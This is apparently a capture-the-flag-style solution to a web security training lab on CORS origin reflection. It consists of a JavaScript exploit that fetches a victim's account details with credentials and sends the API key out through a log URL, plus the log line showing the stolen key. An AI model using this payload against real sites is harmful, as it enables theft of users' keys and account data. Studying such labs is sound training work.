### CORS vulnerability with basic origin reflection

```
<script>
    fetch('https://acc51f361e18076480b18f7400cb00e1.web-security-academy.net/accountDetails', {
        credentials: 'include',
    })
        .then(response => response.json())
        .then(data => {
            location = '/log?key=' + data.apikey;
        });

</script>
```
###API Key Via Log
```
"GET /log?key=C6jmr5ha0rCuLJLJwF2Advyo5Ww6jjEi HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/888822"
```
